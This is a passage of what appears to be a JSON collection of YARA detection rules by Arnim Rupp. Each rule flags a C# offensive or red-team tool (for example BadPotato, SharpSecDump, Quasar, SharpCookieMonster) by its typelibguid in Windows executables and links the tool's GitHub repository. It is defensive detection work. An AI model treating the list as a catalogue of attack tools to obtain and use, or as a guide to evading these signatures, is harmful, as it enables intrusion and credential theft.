  "HKTL_NET_GUID_Grouper2": "rule HKTL_NET_GUID_Grouper2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/l0ss/Grouper2/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5decaea3-2610-4065-99dc-65b9b4ba6ccd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CasperStager": "rule HKTL_NET_GUID_CasperStager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ustayready/CasperStager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c653a9f2-0939-43c8-9b93-fed5e2e4c7e6\" ascii nocase wide\n        $typelibguid1 = \"48dfc55e-6ae5-4a36-abef-14bc09d7510b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_TellMeYourSecrets": "rule HKTL_NET_GUID_TellMeYourSecrets {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/TellMeYourSecrets\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9b448062-7219-4d82-9a0a-e784c4b3aa27\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpExcel4_DCOM": "rule HKTL_NET_GUID_SharpExcel4_DCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpExcel4-DCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"68b83ce5-bbd9-4ee3-b1cc-5e9223fab52b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpShooter": "rule HKTL_NET_GUID_SharpShooter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/SharpShooter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"56598f1c-6d88-4994-a392-af337abe5777\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_NoMSBuild": "rule HKTL_NET_GUID_NoMSBuild {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/NoMSBuild\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"034a7b9f-18df-45da-b870-0e1cef500215\" ascii nocase wide\n        $typelibguid1 = \"59b449d7-c1e8-4f47-80b8-7375178961db\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_TeleShadow2": "rule HKTL_NET_GUID_TeleShadow2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ParsingTeam/TeleShadow2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"42c5c356-39cf-4c07-96df-ebb0ccf78ca4\" ascii nocase wide\n        $typelibguid1 = \"0242b5b1-4d26-413e-8c8c-13b4ed30d510\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BadPotato": "rule HKTL_NET_GUID_BadPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BeichenDream/BadPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0527a14f-1591-4d94-943e-d6d784a50549\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_LethalHTA": "rule HKTL_NET_GUID_LethalHTA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/codewhitesec/LethalHTA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"784cde17-ff0f-4e43-911a-19119e89c43f\" ascii nocase wide\n        $typelibguid1 = \"7e2de2c0-61dc-43ab-a0ec-c27ee2172ea6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpStat": "rule HKTL_NET_GUID_SharpStat {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Raikia/SharpStat\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ffc5c721-49c8-448d-8ff4-2e3a7b7cc383\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SneakyService": "rule HKTL_NET_GUID_SneakyService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/SneakyService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"897819d5-58e0-46a0-8e1a-91ea6a269d84\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpExec": "rule HKTL_NET_GUID_SharpExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7fbad126-e21c-4c4e-a9f0-613fcf585a71\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpCOM": "rule HKTL_NET_GUID_SharpCOM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpCOM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"51960f7d-76fe-499f-afbd-acabd7ba50d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Inception": "rule HKTL_NET_GUID_Inception {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/Inception\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"03d96b8c-efd1-44a9-8db2-0b74db5d247a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_sharpwmi": "rule HKTL_NET_GUID_sharpwmi {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/sharpwmi\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"bb357d38-6dc1-4f20-a54c-d664bd20677e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CVE_2019_1064": "rule HKTL_NET_GUID_CVE_2019_1064 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RythmStick/CVE-2019-1064\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ff97e98a-635e-4ea9-b2d0-1a13f6bdbc38\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Tokenvator": "rule HKTL_NET_GUID_Tokenvator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Tokenvator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"4b2b3bd4-d28f-44cc-96b3-4a2f64213109\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_WheresMyImplant": "rule HKTL_NET_GUID_WheresMyImplant {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/WheresMyImplant\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cca59e4e-ce4d-40fc-965f-34560330c7e6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Naga": "rule HKTL_NET_GUID_Naga {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/byt3bl33d3r/Naga\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"99428732-4979-47b6-a323-0bb7d6d07c95\" ascii nocase wide\n        $typelibguid1 = \"a2c9488f-6067-4b17-8c6f-2d464e65c535\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpBox": "rule HKTL_NET_GUID_SharpBox {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P1CKLES/SharpBox\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"616c1afb-2944-42ed-9951-bf435cadb600\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_rundotnetdll32": "rule HKTL_NET_GUID_rundotnetdll32 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/rundotnetdll32\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a766db28-94b6-4ed1-aef9-5200bbdd8ca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AntiDebug": "rule HKTL_NET_GUID_AntiDebug {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/AntiDebug\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"997265c1-1342-4d44-aded-67964a32f859\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DInvisibleRegistry": "rule HKTL_NET_GUID_DInvisibleRegistry {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/DInvisibleRegistry\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"31d576fb-9fb9-455e-ab02-c78981634c65\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_TikiTorch": "rule HKTL_NET_GUID_TikiTorch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/TikiTorch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"806c6c72-4adc-43d9-b028-6872fa48d334\" ascii nocase wide\n        $typelibguid1 = \"2ef9d8f7-6b77-4b75-822b-6a53a922c30f\" ascii nocase wide\n        $typelibguid2 = \"8f5f3a95-f05c-4dce-8bc3-d0a0d4153db6\" ascii nocase wide\n        $typelibguid3 = \"1f707405-9708-4a34-a809-2c62b84d4f0a\" ascii nocase wide\n        $typelibguid4 = \"97421325-b6d8-49e5-adf0-e2126abc17ee\" ascii nocase wide\n        $typelibguid5 = \"06c247da-e2e1-47f3-bc3c-da0838a6df1f\" ascii nocase wide\n        $typelibguid6 = \"fc700ac6-5182-421f-8853-0ad18cdbeb39\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_HiveJack": "rule HKTL_NET_GUID_HiveJack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Viralmaniar/HiveJack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e12e62fe-bea3-4989-bf04-6f76028623e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DecryptAutoLogon": "rule HKTL_NET_GUID_DecryptAutoLogon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/DecryptAutoLogon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"015a37fc-53d0-499b-bffe-ab88c5086040\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_UnstoppableService": "rule HKTL_NET_GUID_UnstoppableService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/UnstoppableService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0c117ee5-2a21-dead-beef-8cc7f0caaa86\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpWMI": "rule HKTL_NET_GUID_SharpWMI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpWMI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_EWSToolkit": "rule HKTL_NET_GUID_EWSToolkit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/EWSToolkit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"ca536d67-53c9-43b5-8bc8-9a05fdc567ed\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SweetPotato": "rule HKTL_NET_GUID_SweetPotato {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SweetPotato\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6aeb5004-6093-4c23-aeae-911d64cacc58\" ascii nocase wide\n        $typelibguid1 = \"1bf9c10f-6f89-4520-9d2e-aaf17d17ba5e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_memscan": "rule HKTL_NET_GUID_memscan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/memscan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"79462f87-8418-4834-9356-8c11e44ce189\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpStay": "rule HKTL_NET_GUID_SharpStay {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpStay\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2963c954-7b1e-47f5-b4fa-2fc1f0d56aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpLocker": "rule HKTL_NET_GUID_SharpLocker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Pickfordmatt/SharpLocker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"a6f8500f-68bc-4efc-962a-6c6e68d893af\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SauronEye": "rule HKTL_NET_GUID_SauronEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/vivami/SauronEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0f43043d-8957-4ade-a0f4-25c1122e8118\" ascii nocase wide\n        $typelibguid1 = \"086bf0ca-f1e4-4e8f-9040-a8c37a49fa26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_sitrep": "rule HKTL_NET_GUID_sitrep {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/sitrep\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"12963497-988f-46c0-9212-28b4b2b1831b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpClipboard": "rule HKTL_NET_GUID_SharpClipboard {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpClipboard\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"97484211-4726-4129-86aa-ae01d17690be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpCookieMonster": "rule HKTL_NET_GUID_SharpCookieMonster {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/m0rv4i/SharpCookieMonster\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"566c5556-1204-4db9-9dc8-a24091baaa8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_p0wnedShell": "rule HKTL_NET_GUID_p0wnedShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Cn33liz/p0wnedShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2e9b1462-f47c-48ca-9d85-004493892381\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpMove": "rule HKTL_NET_GUID_SharpMove {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpMove\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"8bf82bbe-909c-4777-a2fc-ea7c070ff43e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_C_Sharp_R_A_T_Client": "rule HKTL_NET_GUID_C_Sharp_R_A_T_Client {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/AdvancedHacker101/C-Sharp-R.A.T-Client\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"6d9e8852-e86c-4e36-9cb4-b3c3853ed6b8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpPrinter": "rule HKTL_NET_GUID_SharpPrinter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpPrinter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"41b2d1e5-4c5d-444c-aa47-629955401ed9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_EvilFOCA": "rule HKTL_NET_GUID_EvilFOCA {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ElevenPaths/EvilFOCA\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f26bdb4a-5846-4bec-8f52-3c39d32df495\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PoshC2_Misc": "rule HKTL_NET_GUID_PoshC2_Misc {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/PoshC2_Misc\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"85773eb7-b159-45fe-96cd-11bad51da6de\" ascii nocase wide\n        $typelibguid1 = \"9d32ad59-4093-420d-b45c-5fff391e990d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Sharpire": "rule HKTL_NET_GUID_Sharpire {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xbadjuju/Sharpire\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"39b75120-07fe-4833-a02e-579ff8b68331\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Sharp_SMBExec": "rule HKTL_NET_GUID_Sharp_SMBExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-SMBExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"344ee55a-4e32-46f2-a003-69ad52b55945\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_MiscTools": "rule HKTL_NET_GUID_MiscTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/MiscTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"384e9647-28a9-4835-8fa7-2472b1acedc0\" ascii nocase wide\n        $typelibguid1 = \"d7ec0ef5-157c-4533-bbcd-0fe070fbf8d9\" ascii nocase wide\n        $typelibguid2 = \"10085d98-48b9-42a8-b15b-cb27a243761b\" ascii nocase wide\n        $typelibguid3 = \"6aacd159-f4e7-4632-bad1-2ae8526a9633\" ascii nocase wide\n        $typelibguid4 = \"49a6719e-11a8-46e6-ad7a-1db1be9fea37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_MemoryMapper": "rule HKTL_NET_GUID_MemoryMapper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/MemoryMapper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9fbf3ac-05d8-4cd5-9694-b224d4e6c0ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_VanillaRAT": "rule HKTL_NET_GUID_VanillaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DannyTheSloth/VanillaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d0f2ee67-0a50-423d-bfe6-845da892a2db\" ascii nocase wide\n        $typelibguid1 = \"a593fcd2-c8ab-45f6-9aeb-8ab5e20ab402\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_UnmanagedPowerShell": "rule HKTL_NET_GUID_UnmanagedPowerShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/UnmanagedPowerShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"dfc4eebb-7384-4db5-9bad-257203029bd9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Quasar": "rule HKTL_NET_GUID_Quasar {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/quasar/Quasar\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cfda6d2e-8ab3-4349-b89a-33e1f0dab32b\" ascii nocase wide\n        $typelibguid1 = \"c7c363ba-e5b6-4e18-9224-39bc8da73172\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpAdidnsdump": "rule HKTL_NET_GUID_SharpAdidnsdump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpAdidnsdump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"cdb02bc2-5f62-4c8a-af69-acc3ab82e741\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DotNetToJScript": "rule HKTL_NET_GUID_DotNetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DotNetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"7e3f231c-0d0b-4025-812c-0ef099404861\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Inferno": "rule HKTL_NET_GUID_Inferno {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Inferno\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"26d498f7-37ae-476c-97b0-3761e3a919f0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpSearch": "rule HKTL_NET_GUID_SharpSearch {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"98fee742-8410-4f20-8b2d-d7d789ab003d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpSecDump": "rule HKTL_NET_GUID_SharpSecDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/G0ldenGunSec/SharpSecDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e2fdd6cc-9886-456c-9021-ee2c47cf67b7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
